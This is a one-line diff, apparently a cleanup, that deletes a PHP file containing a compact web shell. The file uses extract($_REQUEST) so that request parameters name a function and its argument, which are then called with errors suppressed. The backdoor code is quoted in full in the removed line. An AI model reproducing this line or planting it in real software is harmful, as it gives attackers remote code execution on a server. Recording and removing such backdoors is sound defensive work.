@@ -1,1 +1,0 @@
-<?php extract($_REQUEST) && @$catch(stripslashes($except)) && exit;
